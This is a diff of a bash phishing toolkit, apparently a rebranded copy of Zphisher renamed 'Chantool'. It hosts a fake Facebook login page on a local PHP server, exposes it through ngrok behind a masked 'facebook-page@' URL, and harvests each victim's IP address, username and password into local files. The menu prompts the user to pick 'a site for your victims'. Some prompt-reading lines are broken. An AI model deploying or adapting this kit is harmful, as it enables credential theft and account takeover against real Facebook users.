@@ -1,9 +1,6 @@
 #!/bin/bash
 
-## ANSI colors (FG & BG)
-RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
-
-## Directories
+## directories
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
@@ -14,28 +11,21 @@ else
 	mkdir -p ".server/www"
 fi
 
-## Script termination
+## terminated
 exit_on_signal_SIGINT() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+    { printf "Chantool Interrupted." 2>&1;}
     exit 0
 }
 
 exit_on_signal_SIGTERM() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+    { printf "Chantool Terminated." 2>&1;}
     exit 0
 }
 
 trap exit_on_signal_SIGINT SIGINT
 trap exit_on_signal_SIGTERM SIGTERM
 
-## Reset terminal colors
-reset_color() {
-	tput sgr0   # reset attributes
-	tput op     # reset color
-    return
-}
-
-## Kill already running process
+## kill process already running 
 kill_pid() {
 	if [[ $(pidof php) ]]; then
 		killall php > /dev/null 2>&1
@@ -45,53 +35,34 @@ kill_pid() {
 	fi	
 }
 
-## Banner
+## logo
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : 2.1
-
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		CHANTOOLS
 	EOF
 }
 
-## Small Banner
-banner_small() {
-	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.1
-	EOF
-}
-
-## Dependencies
+## dependencies
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+	echo -e "Installing required packages..."
 
     if [[ -d "/data/data/com.termux/files/home" ]]; then
         if [[ $(command -v proot) ]]; then
             printf ''
         else
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}""${WHITE}"
+			echo -e "Packages Installing..."
             pkg install proot resolv-conf -y
         fi
     fi
 
 	if [[ $(command -v php) && $(command -v wget) && $(command -v curl) && $(command -v unzip) ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+		echo -e "Packages has been installed."
 	else
 		pkgs=(php curl wget unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}""${WHITE}"
+				echo -e "Installing package"
+				
 				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then
@@ -102,9 +73,11 @@ dependencies() {
 					sudo pacman -S "$pkg" --noconfirm
 				elif [[ $(command -v dnf) ]]; then
 					sudo dnf -y install "$pkg"
+					
 				else
-					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
-					{ reset_color; exit 1; }
+				
+					echo -e "Sorry, your package manager isn't supported this. Just install it manually."
+					exit 1
 				fi
 			}
 		done
@@ -112,7 +85,7 @@ dependencies() {
 
 }
 
-## Download Ngrok
+## downloading ngrok
 download_ngrok() {
 	url="$1"
 	file=$(basename "$url")
@@ -126,17 +99,18 @@ download_ngrok() {
 		rm -rf "$file" > /dev/null 2>&1
 		chmod +x .server/ngrok > /dev/null 2>&1
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
-		{ reset_color; exit 1; }
+		echo -e "Downloading failed. Install Ngrok manually."
+		exit 1
 	fi
 }
 
-## Install ngrok
+## installing ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+		echo -e "Ngrok has been installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok...""${WHITE}"
+	
+		echo -e "Installing ngrok..." 
 		arch=$(uname -m)
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
@@ -151,99 +125,90 @@ install_ngrok() {
 
 }
 
-## Exit message
-msg_exit() {
+## exit msg
+exit_msg() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
-	{ reset_color; exit 0; }
+	echo -e "Thanks for using my tools. Ciao!"
+	exit 0
 }
 
-## About
+## abt
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
-		${GREEN}Version  ${RED}:  ${ORANGE}2.1
-
-		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Mustakim Ahmed ${RESETBG}
-
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
-
+		ulul pakyu
 	EOF
 
-	read -r "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -r "Select an option :"
 
-	if [[ "$REPLY" == 99 ]]; then
-		msg_exit
+	if [[ "$REPLY" == x || "$REPLY" == X ]]; then
+		exit_msg
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
-		{ sleep 1; main_menu; }
+		echo -ne "Returning to main menu..."
+		{ sleep 1; ch_main_menu; }
 	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+		echo -ne "Can't identify this option. Kindly, try again."
 		{ sleep 1; about; }
 	fi
 }
 
-## Setup website and start php server
+## website & php setup
 HOST='127.0.0.1'
 PORT='8080'
 
 setup_site() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server...""${WHITE}"
+	echo -e "start setting up server..."
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server...""${WHITE}"
+	echo -ne "setting up PHP server..." 
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
 
-## Get IP address
-capture_ip() {
+## grabbing IP
+grap_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
+	echo -e "\nVictim's IP : $IP"
+	echo -ne "\n-Saved in : ip.txt"
 	cat .server/www/ip.txt >> ip.txt
 }
 
-## Get credentials
-capture_creds() {
+## grab credentials
+grab_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
+	echo -e "\nAccount : $ACCOUNT"
+	echo -e "\nPassword : $PASSWORD"
+	echo -e "\nSaved in : usernames.dat"
 	cat .server/www/usernames.txt >> usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\nWaiting for another login info. Ctrl + C to exit. "
 }
 
-## Print data
-capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+## data print
+grab_data() {
+	echo -ne "\nWaiting for login info. Type Ctrl + C to exit. "
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
-			capture_ip
+			echo -e "\n\nFound! Victim's IP address l"
+			grap_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
-			capture_creds
+			echo -e "\n\nFound! Victim's login info."
+			grab_creds
 			rm -rf .server/www/usernames.txt
 		fi
 		sleep 0.75
 	done
 }
 
-## Start ngrok
-start_ngrok() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+## start ngrok
+ch_start_ngrok() {
+	echo -e "\nInitializing... http://$HOST:$PORT"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -ne "\n\n Launching yout Ngrok link..."
 
     if [[ $(command -v termux-chroot) ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
@@ -251,83 +216,83 @@ start_ngrok() {
         sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
 
-	{ sleep 8; clear; banner_small; }
+	{ sleep 8; clear; banner; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
-	capture_data
+	echo -e "\nURL 1 : $ngrok_url"
+	echo -e "\nURL 2 : $mask@$ngrok_url1"
+	grab_data
 }
 
-## Start localhost
-start_localhost() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+## start the localhost
+starting_localhost() {
+	echo -e "\nInitializing... (http://$HOST:$PORT)"
 	setup_site
-	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
-	capture_data
+	{ sleep 1; clear; banner; }
+	echo -e "\nSuccessfully Hosted at : http://$HOST:$PORT"
+	grab_data
 }
 
-## Tunnel selection
-tunnel_menu() {
-	{ clear; banner_small; }
+## Tunnel 
+menu_tunnel() {
+	{ clear; banner; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
-		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Best${RED}]
+		[01] Localhost for developers
+		[02]Ngrok.io for public access
 
 	EOF
 
-	read -r "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+	read -r "Select a port forwarding service : "
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		start_localhost
+		starting_localhost
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		start_ngrok
+		ch_start_ngrok
 	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; tunnel_menu; }
+		echo -ne "\nInvalid option. Try Again..."
+		{ sleep 1; menu_tunnel; }
 	fi
 }
 
-## Facebook
-site_facebook() {
+## fb
+site_fb() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} My Facebook Page 
+		[1] My Facebook Page 
 
 	EOF
 
-	read -r "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -r "Select an option :"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		website="facebook"
-		mask='http://blue-verified-badge-for-facebook-free'
+		mask='http://facebook-page'
 	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_facebook; }
+		echo -ne "\nInvalid Option. Try Again."
+		{ sleep 1; clear; banner; site_fb; }
 	fi
 }
 
-## Menu
-main_menu() {
+## my menu
+ch_main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		Choice a site for your victims 
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook  
+		[01] Facebook 
 
 EOF
 	
-	read -r "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -r "Select an option : "
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		site_facebook
-		fi
+		site_fb
+		fi 
 }
 
-## Main
+## chantools main
 kill_pid
 dependencies
 install_ngrok
-main_menu
+ch_main_menu
